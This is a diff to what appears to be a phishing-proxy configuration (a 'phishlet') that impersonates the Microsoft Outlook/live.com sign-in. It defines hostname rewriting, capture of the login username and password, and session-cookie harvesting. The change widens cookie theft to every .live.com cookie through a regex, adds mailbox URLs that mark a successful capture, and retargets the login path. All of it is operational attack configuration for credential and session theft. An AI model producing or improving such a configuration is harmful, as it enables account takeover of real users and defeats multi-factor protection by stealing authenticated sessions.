@@ -22,11 +22,11 @@ sub_filters:
   - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'https://{hostname}', replace: 'https://{orig_hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
 auth_tokens:
   - domain: '.live.com'
-    keys: ['sid','WLSSC','RPSSecAuth','MSPOK','MSCC','OParams','MSPRequ','__Host-MSAAUTH']
-  - domain: '.microsoft.com'
-    keys: ['__UCIS_I','MS0','MC1','MSFPC','ai_session']
-  - domain: 'privacynotice.account.microsoft.com'
-    keys: ['__UCIS_I','MS0','MC1','MSFPC','ai_session']
+    keys: ['.*,regexp']
+    type: 'cookie'
+auth_urls:
+  - '/mail/0/'
+  - '/mail/0/.*'
 credentials:
   username:
     key: 'login'
@@ -38,4 +38,4 @@ credentials:
     type: 'post'
 login:
   domain: 'outlook.live.com'
-  path: '/mail/0/inbox?nlp=1'
+  path: '/owa/?nlp=1'
